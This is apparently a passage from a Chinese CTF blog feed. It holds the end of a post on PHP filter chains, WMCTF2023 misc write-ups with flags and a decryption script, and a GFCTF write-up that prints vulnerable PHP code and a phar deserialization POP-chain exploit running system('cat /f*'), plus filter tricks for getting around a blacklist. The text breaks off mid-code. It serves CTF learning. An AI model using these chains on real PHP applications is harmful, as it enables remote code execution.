class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>)</span>);<span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;ba��fedc&quot;</span><span class="hljs-comment">// 使用 base64 去掉冗余位</span>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&quot;</span>)</span>);<span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;bafedQ==&quot;</span><span class="hljs-comment">// 再次使用 r4 交换位置</span>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>)</span>);<span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;efab==Qd&quot;</span></code></pre></div><p>文章的作者提出了他的细节，这里并没有使用 <code>abcdefgh</code> 8 字节为例，这是因为 <code>r4</code> 编码对于字节有要求，一定需要 4 字节为一组，而我们再产生 2 字节冗余之后会引起 <code>r4</code> 报错，使得 <code>r4</code> 编码失效，所以这里为了方便举例就没有使用 8 字节。</p><p>虽然是为了方便，但这也是需要解决的问题</p><h3 id="Part2-1-两个等号的处理"><a href="#Part2-1-两个等号的处理" class="headerlink" title="Part2.1 - 两个等号的处理"></a>Part2.1 - 两个等号的处理</h3><p>使用该filt将两个等号转换成24字节的字符串（至于为什么去看参考文章吧）</p><div class="code-wrapper"><pre><code class="hljs dos">php &gt; var_dump(file_get_contents(&quot;php://filter/<span class="hljs-built_in">convert</span>.quoted-printable-encode|<span class="hljs-built_in">convert</span>.quoted-printable-encode|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7/resource=data:,==&quot;));string(<span class="hljs-number">24</span>) &quot;+---AD0-<span class="hljs-number">3</span>D3D+---AD0-<span class="hljs-number">3</span>D3D&quot;</code></pre></div><p>算了，写不下去了（没有自己的理解，反正也是跟着文章作者走的），看完也不是很懂，还是看别人的优质文章吧</p><p><a href="https://tttang.com/archive/1755/">The End of AFR? - 跳跳糖 (tttang.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2023</title>
    <link href="/2023/08/24/WMCTF2023/"/>
    <url>/2023/08/24/WMCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="WMCTF2023（复现）"><a href="#WMCTF2023（复现）" class="headerlink" title="WMCTF2023（复现）"></a>WMCTF2023（复现）</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><div class="code-wrapper"><pre><code class="hljs python">WMCTF&#123;Welcome_W&amp;MCTF_2023!&#125;</code></pre></div><h3 id="Fantastic-terminal"><a href="#Fantastic-terminal" class="headerlink" title="Fantastic terminal"></a>Fantastic terminal</h3><div class="code-wrapper"><pre><code class="hljs python">cat challenge<span class="hljs-comment">#WMCTF&#123;fanta3t1c_term1nal_1n_the_c0nta1ner_1n_the_br0w3er&#125;</span></code></pre></div><h3 id="Fantastic-terminal-Rev"><a href="#Fantastic-terminal-Rev" class="headerlink" title="Fantastic terminal Rev"></a>Fantastic terminal Rev</h3><p>把程序base64 dump下来分析</p><p><img src="/2023/08/24/WMCTF2023/image-20230824113839462.png" alt="image-20230824113839462"></p><div class="code-wrapper"><pre><code class="hljs python">c = <span class="hljs-string">&#x27;&#x27;&#x27;6120291406111F57</span><span class="hljs-string">37260D37353C3724</span><span class="hljs-string">330D3E333C633F20</span><span class="hljs-string">3127340D20372634</span><span class="hljs-string">3333220D353C6339</span><span class="hljs-string">3A3A3A3A3A3A3126</span><span class="hljs-string">2F3A3A3A3A3A3A3A&#x27;&#x27;&#x27;</span>c = c.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)c = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c]e = []flag =<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:    d = []    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(i)//<span class="hljs-number">2</span>):        d.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i[j*<span class="hljs-number">2</span>:j*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^<span class="hljs-number">0x52</span>))    d.reverse()    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:        flag+=j    <span class="hljs-comment"># e.append(d)</span><span class="hljs-built_in">print</span>(flag)<span class="hljs-comment">#WMCTF&#123;r3venge_term1nal_after_fuck1ng_paatchhhhhhhhhhhhh&#125;</span></code></pre></div><h3 id="Oversharing"><a href="#Oversharing" class="headerlink" title="Oversharing"></a>Oversharing</h3><p>导出SMB对象，保存dmp文件，使用minikatz分析获取ssh连接的密码</p><p><img src="/2023/08/24/WMCTF2023/image-20230824114110135.png" alt="image-20230824114110135"></p><p>看到ssh的password，<code>ssh randark@题目环境 -p 端口</code></p><p><img src="/2023/08/24/WMCTF2023/640.png" alt="图片"></p><p>然后获取flag</p><h3 id="find-me"><a href="#find-me" class="headerlink" title="find me"></a>find me</h3><p>题目描述前往<code>Reddit</code>寻找<code>WearyMeadow</code></p><p><img src="/2023/08/24/WMCTF2023/image-20230824114436116.png" alt="image-20230824114436116"></p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">aHR0cHM6Ly91ZmlsZS5pby82NzB1bnN6cA</span>==<span class="hljs-comment">#https://ufile.io/670unszp    (流量包下载链接)</span></code></pre></div><p>用户有个<code>my blog</code>连接，</p><p><img src="/2023/08/24/WMCTF2023/image-20230824114825505.png" alt="image-20230824114825505"></p><p>文章打开需要密码</p><p><code>WearyMeadow</code>在<code>Rebbit</code>的头像为<code>github</code>的初始头像，于是到<a href="github.com">github.com</a>上搜索该用户</p><p><img src="/2023/08/24/WMCTF2023/image-20230824115253229.png" alt="image-20230824115253229"></p><p>发现两个自动登录脚本，打开后发现密码</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">usernameStr</span> = <span class="hljs-string">&#x27;WearyMeadow&#x27;</span><span class="hljs-attr">passwordStr</span> = <span class="hljs-string">&#x27;P@sSW0rD123$%^&#x27;</span></code></pre></div><p>尝试用密码打开文章，成功解密，得到了server.py与client.py</p><p>分析逻辑写出decrypt函数的代码，（缺少key和数据）</p><p>wireshark分析流量包</p><p><img src="/2023/08/24/WMCTF2023/640-16928495892856.png" alt="图片"></p><p><img src="/2023/08/24/WMCTF2023/640-16928495954419.png" alt="图片"></p><p><img src="/2023/08/24/WMCTF2023/640-169284960612612.png" alt="图片"></p><p>说明<code>key</code>为<code>mysecretkey</code>，然后将该数据转化为原始数据</p><p><img src="/2023/08/24/WMCTF2023/640-169284963012315.png" alt="图片"></p><p>最长的一串应该还有flag信息</p><div class="code-wrapper"><pre><code class="hljs css">import socketimport random<span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Cipher</span> import AES<span class="hljs-selector-tag">from</span> sys import argvimport binasciidef pad(s):    return s + b<span class="hljs-string">&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)def <span class="hljs-built_in">encrypt</span>(message, key):    seed = random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">11451</span>)    random.<span class="hljs-built_in">seed</span>(seed)    encrypted = b<span class="hljs-string">&#x27;&#x27;</span>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):        encrypted += <span class="hljs-built_in">bytes</span>([message[i] ^ random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])    cipher = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_ECB)    encrypted = cipher.<span class="hljs-built_in">encrypt</span>(<span class="hljs-built_in">pad</span>(encrypted))    return encryptedkey = b<span class="hljs-string">&#x27;mysecretkey&#x27;</span>.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">16</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-built_in">print</span>(key)hex_ciphertext = <span class="hljs-string">&quot;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&quot;</span>ciphertext = binascii.<span class="hljs-built_in">unhexlify</span>(hex_ciphertext)cipher = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_ECB)decrypted_data = cipher.<span class="hljs-built_in">decrypt</span>(ciphertext)<span class="hljs-built_in">print</span>(decrypted_data)unpadded = decrypted_data.<span class="hljs-built_in">rstrip</span>(b<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-built_in">print</span>(unpadded)<span class="hljs-built_in">print</span>()for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">11451</span>):          #爆破种子    seed = i    random.<span class="hljs-built_in">seed</span>(seed)    original_message = b<span class="hljs-string">&#x27;&#x27;</span>    for j in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(unpadded)):        original_message += <span class="hljs-built_in">bytes</span>([unpadded[j] ^ random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])    # <span class="hljs-built_in">print</span>(original_message)    if b<span class="hljs-string">&#x27;WMCTF&#x27;</span> in original_message:        <span class="hljs-built_in">print</span>(original_message)        #b<span class="hljs-string">&#x27;well, here you are: WMCTF&#123;OH_Y0u_f1nd_Me__(@_@)&#125;&#x27;</span></code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h2 id="GFCTF–文件查看器"><a href="#GFCTF–文件查看器" class="headerlink" title="GFCTF–文件查看器"></a>GFCTF–文件查看器</h2><p>本题目可在<a href="https://www.ctfer.vip/">NSSCTF</a>平台复现</p><p>目录扫描发现<code>www.zip</code></p><p><code>User.class.php</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;view/login.html&quot;</span>);            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;                <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];                <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>())&#123;                    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:./?c=Files&amp;m=read&quot;</span>);                &#125;            &#125;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;            (@<span class="hljs-variable language_">$this</span>-&gt;password)();        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;             (<span class="hljs-variable">$name</span>)();        &#125;    &#125;</code></pre></div><p><code>Myerror.class.php</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;error_log&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/log/error.txt&#x27;</span>);            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;log_errors&#x27;</span>,<span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;        &#125;    &#125;</code></pre></div><p><code>Files.class.php</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>();        &#125;                <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;view/file.html&quot;</span>);            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;                <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请输入文件名&quot;</span>);            &#125;            <span class="hljs-variable">$contents</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&lt;textarea class=&quot;file_content&quot; type=&quot;text&quot; value=&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$contents</span>;        &#125;                <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;filename))&#123;                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;这不合理&quot;</span>);            &#125;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;write&#x27;</span>]))&#123;                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$contents</span>);            &#125;            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;                <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;该文件不存在或者内容为空&quot;</span>);            &#125;         &#125;         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable">$log</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;            (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);        &#125;    &#125;</code></pre></div><h3 id="代码审计-（只是看代码得出的信息，没有实际操作）"><a href="#代码审计-（只是看代码得出的信息，没有实际操作）" class="headerlink" title="代码审计  （只是看代码得出的信息，没有实际操作）"></a>代码审计  （只是看代码得出的信息，没有实际操作）</h3><p>有两个页面，第一个登陆界面，<code>username=admin,password=admin</code>登录跳转</p><p>第二个页面能够读取文件，若搜索的内容不存在会被写入<code>/var/www/html/log/error.txt</code>中，能够重写文件中的内容</p><ul><li><code>Files.class.php</code>的<code>getFile()</code>的<code>file_get_contents()</code>存在phar反序列化漏洞</li><li>三个文件中存在pop链</li></ul><h3 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h3><div class="code-wrapper"><pre><code class="hljs rust">User::__destruct <span class="hljs-punctuation">-&gt;</span> User::check <span class="hljs-punctuation">-&gt;</span> Myerror::__toString <span class="hljs-punctuation">-&gt;</span> Files::__get</code></pre></div><p>这里比较难的是User::__destruct中的<code>(@$this-&gt;password)();</code>要使用数组调用函数</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        (@<span class="hljs-variable language_">$this</span>-&gt;password)();    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;        (<span class="hljs-variable">$name</span>)();    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<span class="hljs-variable">$a</span>-&gt;password = [<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;check&quot;</span>];<span class="hljs-variable">$b</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<span class="hljs-variable">$b</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<span class="hljs-variable">$b</span>-&gt;username-&gt;test = <span class="hljs-string">&quot;system&quot;</span>;<span class="hljs-variable">$b</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">&quot;cat /f*&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>题目中没发现<code>unserialize()</code>，但能查看文件，想到phar反序列化，那<code>phar://</code>又要解析什么文件呢？</p><p>我们想到<code>log/error.txt</code>的内容为报错信息</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/a5WEKMOeYP8zcHg.png" alt="image.png"></p><p>但其中有脏数据，使用<code>php://filter</code>去除</p><p>先想到最后要把phar文件内容之外的变为非合法字符，然后base64-decode，就只剩phar文件的内容</p><p>那如何转化呢，由<code>utf-8</code>转换为<code>utf-16le</code>的字符，它的每一位字符后面都会加上一个<code>\0</code>，这个<code>\0</code>是不可见字符，但当我们将<code>utf-16le</code>转换为<code>utf-8</code>的时候，只有后面有<code>\0</code>的才会被正常转换，其它的就会被当成乱码<img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817062542437.png" alt="image-20230817062542437"></p><p>但<code>utf-16le</code>被ban了，<code>ucs-2</code>的功能与它相同</p><p>然后要对<code>\0</code>进行处理，使用quoted-printable编码</p><p>即：把phar文件内容依次经过<code>base64-encode</code>、<code>convert.iconv.utf-8.ucs-2</code>、<code>quoted-printable-encode</code></p><p>把结果写入log&#x2F;error.txt</p><p>在解码时先<code>quoted-printable-decode</code>、再<code>convert.iconv.ucs-2.utf-8</code>、最后<code>base64-decode</code></p><h3 id="GC回收机制"><a href="#GC回收机制" class="headerlink" title="GC回收机制"></a>GC回收机制</h3><p>在最后解密完后，要<code>phar://</code>，但是phar被ban了</p><p>为了不让它异常退出，这里使用GC回收机制在<code>throw new Error(&quot;这不合理&quot;);</code>之前提前触发__destruct</p><h3 id="最后顺序与实际操作"><a href="#最后顺序与实际操作" class="headerlink" title="最后顺序与实际操作"></a>最后顺序与实际操作</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        (@<span class="hljs-variable language_">$this</span>-&gt;password)();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;        (<span class="hljs-variable">$name</span>)();    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<span class="hljs-variable">$a</span>-&gt;password = [<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;check&quot;</span>];<span class="hljs-variable">$b</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<span class="hljs-variable">$b</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<span class="hljs-variable">$b</span>-&gt;username-&gt;test = <span class="hljs-string">&quot;system&quot;</span>;<span class="hljs-variable">$b</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">&quot;cat /f*&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-literal">null</span>);<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;a.phar&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php 